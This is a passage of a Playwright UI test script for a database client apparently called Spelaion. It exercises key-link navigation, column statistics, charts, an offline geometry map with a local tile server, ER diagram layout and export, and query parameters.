        box = await panel.locator(".grid-scroller").boundingBox();
        if (!box) await page.waitForTimeout(100);
      }
      return box;
    };
    await ordersNode.locator(".label").dblclick();
    await page.locator(".tabbar .tab.active", { hasText: "orders" }).waitFor();
    await range.filter({ hasText: "rows 1–500" }).waitFor();
    // The table's keys are known once the references panel can be shown.
    const toggle = panel.getByRole("button", { name: "References panel" });
    await toggle.waitFor();
    // The first row's customer_id, as the grid has it.
    let box = await gridBox();
    let widths = (await panel.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    const customerCell = { x: box.x + 52 + widths[0] + 20, y: box.y + 34 + 12 };
    await page.mouse.click(customerCell.x, customerCell.y);
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    const customerId = (await copied(before + 1)).trimEnd();
    assert.match(customerId, /^\d+$/);
    // The cell's menu follows the key; Ctrl+Enter does the same from the keyboard.
    await page.mouse.click(customerCell.x, customerCell.y, { button: "right" });
    const follow = panel.locator(".result-grid-menu").getByRole("menuitem", { name: /^Open referenced row in customer/ });
    await follow.waitFor();
    assert.match(await follow.innerText(), /Ctrl\+Enter/);
    await page.keyboard.press("Escape");
    await shot("sdb-11-key-links");
    // A click on the cell's link opens the referenced customer in a new table data tab.
    await page.mouse.click(box.x + 52 + widths[0] + widths[1] - 8 - 6, customerCell.y);
    await page.locator(".tabbar .tab.active", { hasText: "customer" }).waitFor();
    await range.filter({ hasText: "rows 1–1" }).waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), `id = ${customerId}`);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await shot("sdb-11-referenced-row");

    // Back the other way: the customer's orders in the references panel.
    await panel.getByRole("button", { name: "References panel" }).click();
    const references = panel.getByRole("complementary", { name: "References of the row" });
    await references.waitFor();
    await references.getByRole("heading", { name: "Rows that point here" }).waitFor();
    const ordersKey = references.locator(".reference-key", { hasText: "orders" });
    await ordersKey.locator(".reference-rows li").first().waitFor();
    assert.match(await ordersKey.locator(".reference-columns").innerText(), /^customer_id → id$/);
    assert.match(await ordersKey.locator(".reference-rows li").first().innerText(), new RegExp(`customer_id: ${customerId}`));
    await shot("sdb-11-references-panel");
    await setTheme("dark", "dark");
    await ordersKey.locator(".reference-rows li").first().waitFor();
    await shot("sdb-11-references-panel-dark");
    await setTheme("light", "light");
    await ordersKey.locator(".reference-rows li").first().waitFor();
    // "Open rows" opens every order of this customer, filtered by the core.
    await ordersKey.getByRole("button", { name: "Open rows" }).click();
    await page.locator(".tabbar .tab.active", { hasText: "orders" }).waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), `customer_id = ${customerId}`);
    await panel.locator(".statusline", { hasText: /\d+ rows?/ }).waitFor();
    // And forward again from there, with the keyboard: Ctrl+Enter on customer_id.
    box = await gridBox();
    widths = (await panel.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    await page.mouse.click(box.x + 52 + widths[0] + 20, box.y + 34 + 12);
    await page.keyboard.press("Control+Enter");
    await page.locator(".tabbar .tab.active", { hasText: "customer" }).waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), `id = ${customerId}`);
    // Its page loaded (closing a tab that is still running asks first).
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    // The four tabs opened here, closed one at a time (closing is asynchronous).
    for (let i = 0; i < 4; i++) {
      const open = await page.locator(".tabbar .tab").count();
      await page.keyboard.press("Control+w");
      await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n - 1, open);
    }
    assert.equal(await page.locator(".tabbar .tab", { hasText: "customer" }).count(), 0);

    // The table details' References: the keys of other tables that point to customer.
    await customerNode.locator(".twisty").click();
    const customerChildren = customerNode.locator("xpath=..");
    const referencesFolder = customerChildren.getByRole("button", { name: "Expand or collapse References", exact: true });
    await referencesFolder.waitFor();
    assert.equal(await referencesFolder.locator(".muted").innerText(), "1");
    await referencesFolder.dblclick();
    const referencesTab = page.getByRole("region", { name: "References of customer" });
    await referencesTab.waitFor();
    await referencesTab.getByRole("cell", { name: "main.orders" }).waitFor();
    await shot("sdb-11-references-tab");
    await page.keyboard.press("Control+w");
    await referencesTab.waitFor({ state: "detached" });
    await customerNode.locator(".twisty").click();
  }

  step("selection numbers and column statistics");
  {
    await customerNode.locator(".label").dblclick();
    await page.locator(".tabbar .tab.active", { hasText: "customer" }).waitFor();
    await range.filter({ hasText: "rows 1–500" }).waitFor();
    let box = null;
    for (let i = 0; i < 40 && !box; i++) {
      box = await panel.locator(".grid-scroller").boundingBox();
      if (!box) await page.waitForTimeout(100);
    }
    const widths = (await panel.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    // The whole id column (Ctrl+Space): the core adds up 1 to 500.
    await page.mouse.click(box.x + 52 + 20, box.y + 34 + 12);
    await page.keyboard.press("Control+Space");
    await panel.getByRole("button", { name: "Selection numbers panel" }).click();
    const calc = panel.getByRole("complementary", { name: "Selection numbers" });
    await calc.waitFor();
    const field = (name) => calc.locator(".reference-field", { has: page.locator("dt", { hasText: new RegExp(`^${name}$`) }) }).locator("dd");
    await field("Sum").filter({ hasText: /^125250$/ }).waitFor();
    assert.equal(await field("Count").innerText(), "500");
    assert.equal(await field("Distinct").innerText(), "500");
    assert.equal(await field("NULLs").innerText(), "0");
    assert.equal(await field("Average").innerText(), "250.5");
    assert.equal(await field("Median").innerText(), "250.5");
    assert.equal(await field("Minimum").innerText(), "1");
    assert.equal(await field("Maximum").innerText(), "500");
    await shot("sdb-12-calc-panel");
    // Names are not numbers: no sum, but their minimum, maximum and counts.
    await page.mouse.click(box.x + 52 + widths[0] + 20, box.y + 34 + 12);
    await page.keyboard.press("Control+Space");
    await calc.getByText("No numbers in the selection.").waitFor();
    assert.equal(await field("Count").innerText(), "500");
    await setTheme("dark", "dark");
    await calc.getByText("No numbers in the selection.").waitFor();
    await shot("sdb-12-calc-panel-dark");
    await setTheme("light", "light");
    await calc.getByRole("button", { name: "Close selection numbers (Esc)" }).click();
    await calc.waitFor({ state: "detached" });

    // The country column's statistics, counted by the server with read-only queries.
    box = await panel.locator(".grid-scroller").boundingBox();
    const countryX = box.x + 52 + widths[0] + widths[1] + widths[2] + 20;
    await page.mouse.click(countryX, box.y + 18, { button: "right" });
    await panel.locator(".result-grid-menu").getByRole("menuitem", { name: "Column statistics" }).click();
    const stats = page.getByRole("dialog", { name: "Statistics of country" });
    await stats.waitFor();
    await stats.locator(".column-stats-top li").first().waitFor();
    await stats.getByText("Read-only queries on the whole table, in a separate session.").waitFor();
    const statField = (name) => stats.locator(".reference-field", { has: page.locator("dt", { hasText: new RegExp(`^${name}$`) }) }).locator("dd");
    assert.equal(await statField("Rows").innerText(), "500");
    assert.equal(await statField("NULLs").innerText(), "0");
    assert.match(await statField("Distinct").innerText(), /^\d+$/);
    assert.equal(await stats.locator(".column-stats-sampled").count(), 0);
    await shot("sdb-12-column-stats");
    // Every statement shown is a SELECT.
    await stats.locator(".column-stats-sql summary").click();
    const statements = (await stats.locator(".column-stats-sql pre").innerText()).split(/;\n\n/);
    assert.equal(statements.length, 5);
    for (const sql of statements) assert.match(sql, /^SELECT /);
    // A most frequent value filters the table by it, with the core's condition.
    const first = stats.locator(".column-stats-value").first();
    const value = await first.locator(".column-stats-text").innerText();
    const count = Number((await first.locator(".column-stats-count").innerText()).replace(/\D/g, ""));
    await first.click();
    await stats.waitFor({ state: "detached" });
    await page.waitForFunction((v) => document.querySelector('input[aria-label="WHERE"]')?.value === `country = '${v}'`, value);
    await range.filter({ hasText: `rows 1–${count}` }).waitFor();
    await page.keyboard.press("Control+w");
    await page.locator(".tabbar .tab.active", { hasText: "customer" }).waitFor({ state: "detached" });
  }

  step("charts from a result: points prepared by the core, bar, line and pie, saved as PNG and SVG");
  {
    await replaceQuery(panel, "select c.country, count(*) as orders, round(sum(o.total), 2) as revenue from orders o join customer c on c.id = o.customer_id group by c.country order by revenue desc;");
    await run(panel);
    await panel.locator(".statusline", { hasText: "6 rows" }).waitFor();
    await panel.getByRole("button", { name: "Show as chart" }).click();
    const chart = panel.locator(".result-chart");
    const note = chart.locator(".chart-note");
    const svg = chart.locator("svg.chart-svg");
    // The first text column is X and the first number the values: one bar per row.
    await note.filter({ hasText: "6 rows, one point each." }).waitFor();
    assert.equal(await chart.getByRole("combobox", { name: "X axis" }).inputValue(), "0");
    await svg.locator(".chart-title", { hasText: "orders by country" }).waitFor();
    assert.equal(await svg.locator("rect").count(), 6);
    // A second series: a legend names both, each country gets two bars.
    await chart.getByRole("button", { name: /^Values/ }).click();
    await chart.getByRole("checkbox", { name: "revenue" }).check();
    await page.keyboard.press("Escape");
    await svg.locator(".chart-legend-text", { hasText: "revenue" }).waitFor();
    assert.equal(await svg.locator("rect").count(), 6 * 2 + 2);
    await chart.getByRole("checkbox", { name: "revenue" }).waitFor({ state: "detached" });
    await chart.getByRole("button", { name: /^Values/ }).click();
    await chart.getByRole("checkbox", { name: "orders" }).uncheck();
    await page.keyboard.press("Escape");
    await svg.locator(".chart-title", { hasText: "revenue by country" }).waitFor();
    // The keyboard reaches every point: its tooltip names the country and its value.
    await svg.focus();
    await page.keyboard.press("Home");
    await chart.locator(".chart-tooltip .chart-tooltip-row", { hasText: "revenue" }).waitFor();
    await shot("sdb-29-bar-chart");
    await setTheme("dark", "dark");
    await shot("sdb-29-bar-chart-dark");
    await setTheme("light", "light");
    // Save image…: the core writes a real PNG, or an SVG with the theme's colors written in.
    const pngPath = join(tmpdir(), `spelaion-chart-${process.pid}.png`);
    const svgPath = join(tmpdir(), `spelaion-chart-${process.pid}.svg`);
    await page.evaluate((target) => (window.__spelaionSavePath = target), pngPath);
    await chart.getByRole("button", { name: "Save image…" }).click();
    await chart.getByText(`Saved spelaion-chart-${process.pid}.png`).waitFor();
    assert.deepEqual([...readFileSync(pngPath).subarray(0, 8)], [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    await page.evaluate((target) => (window.__spelaionSavePath = target), svgPath);
    await chart.getByRole("button", { name: "Save image…" }).click();
    await chart.getByText(`Saved spelaion-chart-${process.pid}.svg`).waitFor();
    const savedSvg = readFileSync(svgPath, "utf8");
    assert.match(savedSvg, /^<svg[^>]*xmlns="http:\/\/www.w3.org\/2000\/svg"/);
    assert.ok(savedSvg.includes("revenue by country"));
    assert.ok(!savedSvg.includes("var(--"), "the saved SVG carries colors, not the app's tokens");
    await page.evaluate(() => delete window.__spelaionSavePath);
    rmSync(pngPath, { force: true });
    rmSync(svgPath, { force: true });
    // A pie: one series, its largest slices.
    await chart.getByRole("radio", { name: "Pie" }).click();
    await svg.locator(".chart-slice").first().waitFor();
    assert.equal(await svg.locator(".chart-slice").count(), 6);
    await shot("sdb-29-pie-chart");
    // Back to the grid.
    await panel.getByRole("button", { name: "Show as grid" }).click();
    await chart.waitFor({ state: "detached" });

    // A line over 50,000 orders: grouped by day in the core, 280 points at most.
    await replaceQuery(panel, "select date(created) as day, round(total, 2) as total from orders order by day;");
    await run(panel);
    await panel.locator(".statusline", { hasText: "50,000 rows" }).waitFor();
    await panel.getByRole("button", { name: "Show as chart" }).click();
    await chart.getByRole("radio", { name: "Line" }).click();
    await note.filter({ hasText: /^50,000 rows combined into \d+ values of day \(sum of each\)\.$/ }).waitFor();
    assert.equal(await svg.locator("path.chart-line").count(), 1);
    await shot("sdb-29-line-chart");
    // A numeric X with 50,000 values: equal ranges, and the chart says so.
    await chart.getByRole("combobox", { name: "X axis" }).selectOption({ label: "total" });
    await note.filter({ hasText: "50,000 rows: total split into 2,000 equal ranges (sum of each)." }).waitFor();
    await chart.getByRole("combobox", { name: "Combine" }).selectOption("count");
    await note.filter({ hasText: "(count of each)" }).waitFor();
    await shot("sdb-29-line-chart-ranges");
    await panel.getByRole("button", { name: "Show as grid" }).click();

    // A paged query: only its loaded rows, said under the chart.
    await replaceQuery(panel, "select id, total from orders;");
    await run(panel);
    await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
    await panel.getByRole("button", { name: "Show as chart" }).click();
    await note.filter({ hasText: "Only the loaded rows: load every row to chart the whole result." }).waitFor();
    await panel.getByRole("button", { name: "Show as grid" }).click();
    await chart.waitFor({ state: "detached" });
  }

  step("geometry on a map: WKB read by the core, drawn with no network, tiles only from the user's server");
  {
    // Plain WKB blobs (little endian): what DuckDB's spatial and any blob of WKB give.
    const wkb = (type, write) => {
      const parts = [];
      const u32 = (n) => { const b = Buffer.alloc(4); b.writeUInt32LE(n); parts.push(b); };
      const f64 = (n) => { const b = Buffer.alloc(8); b.writeDoubleLE(n); parts.push(b); };
      parts.push(Buffer.from([1]));
      u32(type);
      write(u32, f64);
      return Buffer.concat(parts).toString("hex");
    };
    const points = (u32, f64, list) => { u32(list.length); for (const [x, y] of list) { f64(x); f64(y); } };
    const retiro = [[-3.6905, 40.4185], [-3.6765, 40.4185], [-3.6765, 40.4075], [-3.6905, 40.4075], [-3.6905, 40.4185]];
    const rows = [
      ["Retiro", wkb(3, (u32, f64) => { u32(1); points(u32, f64, retiro); })],
      ["Route", wkb(2, (u32, f64) => points(u32, f64, [[-3.7038, 40.4168], [-3.695, 40.4155], [-3.6883, 40.4066]]))],
      ["Sol", wkb(1, (_u32, f64) => { f64(-3.7038); f64(40.4168); })],
      ["Atocha", wkb(1, (_u32, f64) => { f64(-3.6907); f64(40.4066); })],
    ];
    const values = rows.map(([name, hex]) => `('${name}', x'${hex}')`).concat(["('Nowhere', NULL)"]).join(", ");
    // Every request the web view makes while the map has no tiles: none may leave this computer.
    const requests = [];
    const onRequest = (request) => requests.push(request.url());
    page.on("request", onRequest);
    await replaceQuery(panel, `select column1 as place, column2 as geom from (values ${values});`);
    await run(panel);
    await panel.locator(".statusline", { hasText: "5 rows" }).waitFor();
    const viewerToggle = panel.getByRole("button", { name: "Cell value panel" });
    if ((await viewerToggle.getAttribute("aria-pressed")) !== "true") await viewerToggle.click();
    const viewer = panel.getByRole("complementary", { name: "Cell value" });
    const box = await panel.locator(".grid-scroller").boundingBox();
    const widths = (await panel.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    await page.mouse.click(box.x + 52 + widths[0] + 20, box.y + 34 + 12);
    const mapHost = viewer.locator(".map-host");
    await mapHost.locator("path.map-area").waitFor();
    assert.equal(await viewer.getByRole("button", { name: "Map", exact: true }).getAttribute("aria-pressed"), "true");
    await viewer.getByText("Polygon · WKB · No SRID · read as longitude and latitude").waitFor();
    await viewer.getByText(/^Plain background: no map tiles are loaded\./).waitFor();
    assert.equal(await mapHost.locator(".map-tiles").count(), 0);
    await shot("sdb-60-map-value");

    // The whole column: four shapes, the NULL counted; a shape picks its row.
    await viewer.getByRole("button", { name: "Whole column" }).click();
    await viewer.getByText("4 shapes from 5 rows · 1 NULL · No SRID · read as longitude and latitude").waitFor();
    // Drawn once the map has its size.
    await mapHost.locator('.map-feature[data-feature="3"] path.map-point').waitFor({ state: "attached" });
    assert.equal(await mapHost.locator(".map-feature").count(), 4);
    const pointBox = async (i) => {
      const b = await mapHost.locator(`.map-feature[data-feature="${i}"] path.map-point`).boundingBox();
      return [b.x + b.width / 2, b.y + b.height / 2];
    };
    const [solX, solY] = await pointBox(2);
    await page.mouse.move(solX, solY);
    await mapHost.locator(".map-hover", { hasText: "Row 3" }).waitFor();
    await shot("sdb-60-map-column");
    await page.mouse.click(solX, solY);
    await viewer.locator(".cell-viewer-title", { hasText: "Row 3" }).waitFor();
    // Still the column's map, not read again.
    assert.equal(await mapHost.locator(".map-feature").count(), 4);
    // Keyboard zoom: the points move apart, and 0 fits them again.
    const spread = async () => { const [ax, ay] = await pointBox(2); const [bx, by] = await pointBox(3); return Math.hypot(ax - bx, ay - by); };
    const before = await spread();
    await mapHost.focus();
    await page.keyboard.press("+");
    await page.waitForTimeout(300);
    const zoomed = await spread();
    assert.ok(zoomed > before * 1.3, `zooming in should spread the points: ${before} → ${zoomed}`);
    await page.keyboard.press("0");
    await page.waitForTimeout(300);
    assert.ok(Math.abs((await spread()) - before) < 2, "0 fits the shapes again");
    await setTheme("dark", "dark");
    await mapHost.locator(".map-feature").first().waitFor();
    await shot("sdb-60-map-column-dark");
    await setTheme("light", "light");
    // The value itself is one click away.
    await viewer.getByRole("button", { name: "Value", exact: true }).click();
    await viewer.locator(".cell-viewer-hex").waitFor();
    await viewer.getByRole("button", { name: "Map", exact: true }).click();
    await mapHost.locator(".map-feature").first().waitFor();
    page.off("request", onRequest);
    const away = requests.filter((url) => /^https?:/.test(url) && !new URL(url).hostname.endsWith("localhost"));
    assert.deepEqual(away, [], "the map without tiles asks nothing of the network");

    // Tiles from a server of the user's own (here a local one): sent without a referrer.
    const tileRequests = [];
    const tileServer = createHttpServer((req, res) => {
      tileRequests.push({ url: req.url, referer: req.headers.referer ?? null });
      res.writeHead(200, { "Content-Type": "image/png", "Cache-Control": "no-store" });
      res.end(tilePng());
    });
    await new Promise((done) => tileServer.listen(0, "127.0.0.1", done));
    const tilePort = tileServer.address().port;
    try {
      await withSettings("map", async (settings) => {
        const tiles = settings.locator('input[name="mapTiles"]');
        assert.ok(await tiles.isDisabled(), "tiles need a server first");
        assert.equal(await tiles.isChecked(), false, "tiles are off by default");
        await settings.locator('input[name="tileName"]').fill("Local tiles");
        await settings.locator('input[name="tileUrl"]').fill(`http://127.0.0.1:${tilePort}/{z}/{x}/{y}.png`);
        await page.keyboard.press("Enter");
        await page.waitForFunction(() => document.querySelector('input[name="mapTiles"]')?.disabled === false);
        await settings.locator('input[name="tileAttribution"]').fill("Test tiles");
        await page.keyboard.press("Enter");
        await page.waitForFunction(() => !document.querySelector(".settings-page input:disabled"));
        // An address the core refuses is said, and the saved one stays.
        await settings.locator('input[name="tileUrl"]').fill("http://tiles.example.com/{z}/{x}/{y}.png");
        await page.keyboard.press("Enter");
        await settings.locator(".error", { hasText: "https://" }).waitFor();
        await settings.locator('input[name="tileUrl"]').fill(`http://127.0.0.1:${tilePort}/{z}/{x}/{y}.png`);
        await tiles.check();
        await page.waitForFunction(() => document.querySelector('input[name="mapTiles"]')?.checked && !document.querySelector('input[name="mapTiles"]').disabled);
        await shot("sdb-60-settings-map");
      });
      await mapHost.locator(".map-tiles img").first().waitFor();
      await page.waitForFunction(() => [...document.querySelectorAll(".map-tiles img")].some((img) => img.complete && img.naturalWidth === 256));
      await mapHost.locator(".map-attribution", { hasText: "Local tiles · Test tiles" }).waitFor();
      assert.ok(tileRequests.length > 0, "tiles were asked of the chosen server");
      for (const request of tileRequests) {
        assert.match(request.url, /^\/\d+\/\d+\/\d+\.png$/);
        assert.equal(request.referer, null, "tiles go without a referrer");
      }
      await shot("sdb-60-map-tiles");
      // Hidden for this map with its toggle.
      await mapHost.getByRole("button", { name: "Tiles" }).click();
      await mapHost.locator(".map-tiles").waitFor({ state: "detached" });
    } finally {
      // A dialog left open by a failure above is closed first, so the cleanup cannot hide it.
      if (await page.locator(".settings-dialog").count()) await page.locator(".settings-dialog .wizard-header button").click();
      await withSettings("map", async (settings) => {
        await settings.getByRole("button", { name: "Remove tile server" }).click();
        await page.waitForFunction(() => document.querySelector('input[name="mapTiles"]')?.disabled === true);
      });
      tileServer.close();
    }
    await viewerToggle.click();
    await viewer.waitFor({ state: "detached" });
  }

  step("ER diagram: read from the explorer's catalog, laid out once by the core, panned and zoomed, exported");
  {
    const queryTitle = (await page.locator(".tabbar .tab.active").innerText()).trim();
    const queryTab = page.locator(".tabbar .tab").filter({ hasText: new RegExp(`^${queryTitle}$`) });
    // Around one table: orders and the customer it points to, in crow's foot notation.
    await page.getByRole("button", { name: "Expand or collapse orders", exact: true }).click({ button: "right" });
    await page.getByRole("menuitem", { name: "ER diagram of related tables" }).click();
    await page.locator(".tabbar .tab.active", { hasText: "orders · ER diagram" }).waitFor();
    const view = page.locator(".tab-panel:not([hidden]) .er-view");
    const canvas = view.locator(".er-canvas");
    await canvas.locator(".er-node").nth(1).waitFor();
    assert.equal(await canvas.locator(".er-node").count(), 2);
    assert.equal(await canvas.locator(".er-edge").count(), 1);
    await view.locator(".er-status", { hasText: "2 tables, 1 relation" }).waitFor();
    assert.equal(await canvas.locator(".er-node.focus .er-title").textContent(), "orders");
    assert.deepEqual(await canvas.locator(".er-node.focus .er-name").allTextContents(), ["id", "customer_id", "created", "total"]);
    assert.deepEqual(await canvas.locator(".er-node.focus .er-key").allTextContents(), ["PK", "FK"]);
    assert.equal(await canvas.getAttribute("data-layouts"), "1");
    await shot("sdb-23-focus");
    await setTheme("dark", "dark");
    await shot("sdb-23-focus-dark");
    await setTheme("light", "light");
    // Keys only and names only lay it out again; the catalog is not read again.
    await view.getByRole("radio", { name: "Keys only" }).click();
    await page.waitForFunction(() => document.querySelector(".tab-panel:not([hidden]) .er-canvas")?.getAttribute("data-layouts") === "2");
    assert.deepEqual(await canvas.locator(".er-node.focus .er-name").allTextContents(), ["id", "customer_id"]);
    await view.getByRole("radio", { name: "Names only" }).click();
    await page.waitForFunction(() => document.querySelector(".tab-panel:not([hidden]) .er-canvas")?.getAttribute("data-layouts") === "3");
    assert.equal(await canvas.locator(".er-name").count(), 0);
    await view.getByRole("radio", { name: "All columns" }).click();
    await page.waitForFunction(() => document.querySelector(".tab-panel:not([hidden]) .er-canvas")?.getAttribute("data-layouts") === "4");
    // A table's menu focuses on it in a new tab.
    await canvas.locator(".er-node:not(.focus) .er-box").click({ button: "right" });
    await page.getByRole("menuitem", { name: "Focus on this table" }).click();
    await page.locator(".tabbar .tab.active", { hasText: "customer · ER diagram" }).waitFor();
    await page.locator(".tab-panel:not([hidden]) .er-node.focus .er-title", { hasText: "customer" }).waitFor();
    await page.keyboard.press("Control+w");
    await page.locator(".tabbar .tab.active", { hasText: "orders · ER diagram" }).waitFor();
    await page.keyboard.press("Control+w");
    await page.locator(".tabbar .tab", { hasText: "orders · ER diagram" }).waitFor({ state: "detached" });

    // The schema's explorer menu: the demo's three tables, product with no keys.
    const mainRow = page.getByRole("button", { name: "Expand or collapse schema main" });
    await mainRow.scrollIntoViewIfNeeded();
    await mainRow.click({ button: "right" });
    await page.getByRole("menuitem", { name: "ER diagram", exact: true }).click();
    await page.locator(".tabbar .tab.active", { hasText: "main · ER diagram" }).waitFor();
    await page.locator(".tab-panel:not([hidden]) .er-status", { hasText: "3 tables, 1 relation" }).waitFor();
    // The status line can show before the tables are drawn: wait for the third one, then count.
    await page.locator(".tab-panel:not([hidden]) .er-node").nth(2).waitFor();
    assert.equal(await page.locator(".tab-panel:not([hidden]) .er-node").count(), 3);
    await page.keyboard.press("Control+w");
    await page.locator(".tabbar .tab", { hasText: "main · ER diagram" }).waitFor({ state: "detached" });
    await queryTab.click();

    // 200 generated tables in the schema (dropped below): chains, hubs and lone tables.
    const big = [];
    for (let i = 0; i < 200; i++) {
      const columns = ["id integer primary key", "name text"];
      if (i > 0 && i % 23 !== 0) columns.push(`parent_id integer references er_t${String(Math.floor(i * 0.618)).padStart(3, "0")}`);
      if (i > 3 && i % 3 === 0) columns.push(`hub_id integer not null references er_t${String(i % 4).padStart(3, "0")}`);
      big.push(`create table er_t${String(i).padStart(3, "0")} (${columns.join(", ")});`);
    }
    await replaceQuery(panel, big.join("\n"));
    await run(panel);
    await panel.locator(".statusline", { hasText: "200 OK, 0 failed, 0 not run" }).waitFor({ timeout: 60_000 });
    try {
      // The palette's command: the diagram of the active console's schema.
      await page.keyboard.press("Control+Shift+P");
      const erPalette = page.getByRole("dialog", { name: "Command palette" });
      await erPalette.getByRole("combobox").fill("ER diagram of the current");
      await page.keyboard.press("Enter");
      await page.locator(".tabbar .tab.active", { hasText: "main · ER diagram" }).waitFor();
      const schemaView = page.locator(".tab-panel:not([hidden]) .er-view");
      const schemaCanvas = schemaView.locator(".er-canvas");
      await schemaView.locator(".er-status", { hasText: "203 tables" }).waitFor({ timeout: 60_000 });
      await schemaCanvas.locator(".er-node").nth(202).waitFor();
      assert.equal(await schemaCanvas.getAttribute("data-layouts"), "1");
      const layoutsNow = () => schemaCanvas.getAttribute("data-layouts");
      // Pan (drag, arrows) and zoom (wheel, keys, buttons, fit) never lay it out again.
      const zoomBefore = await schemaView.locator(".er-zoom").innerText();
      const box = await schemaCanvas.boundingBox();
      await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
      await page.mouse.wheel(0, -600);
      await page.waitForFunction((before) => document.querySelector(".tab-panel:not([hidden]) .er-zoom")?.textContent !== before, zoomBefore);
      await page.mouse.down();
      await page.mouse.move(box.x + box.width / 2 + 120, box.y + box.height / 2 + 80, { steps: 5 });
      await page.mouse.up();
      await schemaCanvas.focus();
      for (const key of ["ArrowLeft", "ArrowDown", "+", "-", "1", "0"]) await page.keyboard.press(key);
      await schemaView.getByRole("button", { name: "Zoom in" }).click();
      await schemaView.getByRole("button", { name: "Fit to screen" }).click();
      assert.equal(await layoutsNow(), "1", "panning and zooming never ask for a new layout");
      await shot("sdb-23-schema-200");
      await setTheme("dark", "dark");
      await shot("sdb-23-schema-200-dark");
      await setTheme("light", "light");
      // The layout of 203 tables, from the click to the boxes on screen.
      const started = Date.now();
      await schemaView.getByRole("radio", { name: "Keys only" }).click();
      await page.waitForFunction(() => document.querySelector(".tab-panel:not([hidden]) .er-canvas")?.getAttribute("data-layouts") === "2");
      console.log(`  ER diagram of 203 tables: a new layout on screen in ${Date.now() - started} ms`);
      await shot("sdb-23-schema-200-keys");
      // A click on a table lights up its relations.
      await schemaCanvas.locator(".er-node", { hasText: "er_t001" }).locator(".er-box").click({ force: true });
      await schemaCanvas.locator(".er-node.selected .er-title", { hasText: "er_t001" }).waitFor();
      assert.ok((await schemaCanvas.locator(".er-edge.lit").count()) > 0);
      await page.keyboard.press("Escape");

      // Exports: PNG and SVG drawn here and checked by the core; Mermaid and DBML written by the
      // core, and parsed here by their own tools.
      const files = { png: "PNG image…", svg: "SVG image…", mmd: "Mermaid…", dbml: "DBML…" };
      const saved = {};
      for (const [extension, item] of Object.entries(files)) {
        const target = join(tmpdir(), `spelaion-er-${process.pid}.${extension}`);
        await page.evaluate((path) => (window.__spelaionSavePath = path), target);
        await schemaView.getByRole("button", { name: "Export", exact: true }).click();
        await page.getByRole("menuitem", { name: item }).click();
        await schemaView.getByText(`Saved spelaion-er-${process.pid}.${extension}`).waitFor({ timeout: 60_000 });
        saved[extension] = target;
      }
      await page.evaluate(() => delete window.__spelaionSavePath);
      assert.deepEqual([...readFileSync(saved.png).subarray(0, 8)], [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const svgText = readFileSync(saved.svg, "utf8");
      assert.match(svgText, /^<svg[^>]*xmlns="http:\/\/www.w3.org\/2000\/svg"/);
      assert.ok(svgText.includes("er_t199") && !svgText.includes("var(--"), "the SVG carries every table and real colors");
      const mermaidText = readFileSync(saved.mmd, "utf8");
      const dbmlText = readFileSync(saved.dbml, "utf8");
      const { default: mermaid } = await import("mermaid");
      await mermaid.parse(mermaidText);
      const { Parser } = await import("@dbml/core");
      const database = new Parser().parse(dbmlText, "dbml");
      assert.equal(database.schemas.flatMap((schema) => schema.tables).length, 203);
      assert.ok(mermaidText.includes('"customer" ||..o{ "orders" : "fk_0"'), mermaidText.slice(0, 400));
      for (const path of Object.values(saved)) rmSync(path, { force: true });

      // The same command again shows the tab already open on that schema.
      await queryTab.click();
      await page.keyboard.press("Control+Shift+P");
      await erPalette.getByRole("combobox").fill("ER diagram of the current");
      await page.keyboard.press("Enter");
      await page.locator(".tabbar .tab.active", { hasText: "main · ER diagram" }).waitFor();
      assert.equal(await page.locator(".tabbar .tab", { hasText: "main · ER diagram" }).count(), 1);
      await page.keyboard.press("Control+w");
      await page.locator(".tabbar .tab", { hasText: "main · ER diagram" }).waitFor({ state: "detached" });
    } finally {
      // Back to the demo's three tables.
      const drops = [];
      for (let i = 199; i >= 0; i--) drops.push(`drop table if exists er_t${String(i).padStart(3, "0")};`);
      await queryTab.click();
      await replaceQuery(panel, drops.join("\n"));
      await run(panel);
      const risk = page.getByRole("dialog", { name: "Run these statements?" });
      await risk.getByRole("button", { name: "Run anyway", exact: true }).click({ timeout: 30_000 });
      await panel.locator(".statusline", { hasText: "200 OK, 0 failed, 0 not run" }).waitFor({ timeout: 60_000 });
    }
  }

  step("query parameters: :name values asked once, written in by the core");
  await replaceQuery(panel, "select :name as who, :n + 1 as next, :name || '!' as again;");
  await run(panel);
  const paramsDialog = page.getByRole("dialog", { name: "Query parameters" });
  await paramsDialog.locator(".field .mono").nth(1).waitFor();
  assert.deepEqual(await paramsDialog.locator(".field .mono").allInnerTexts(), [":name", ":n"]);
  await page.keyboard.insertText("O'Brien");
  await paramsDialog.locator("input").nth(1).fill("41");
  await shot("05g-query-parameters");
  await page.keyboard.press("Enter");
  await paramsDialog.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(box.x + 80, box.y + 34 + 12);
    await page.keyboard.press("Control+a");
    await page.keyboard.press("Control+c");
    assert.equal((await copied(before + 1)).trimEnd(), "O'Brien\t42\tO'Brien!");
  }
  // The values are offered again; Escape cancels without running.
  await run(panel);
  assert.equal(await page.getByRole("dialog", { name: "Query parameters" }).locator("input").first().inputValue(), "O'Brien");
  await page.keyboard.press("Escape");
  await page.getByRole("dialog", { name: "Query parameters" }).waitFor({ state: "detached" });

  step("saved queries: Ctrl+S names the SQL, the panel opens and deletes it");
  await replaceQuery(panel, "select 'snippet_marker' as saved;");
  await page.keyboard.press("Control+s");
  const saveDialog = page.getByRole("dialog", { name: "Save query" });
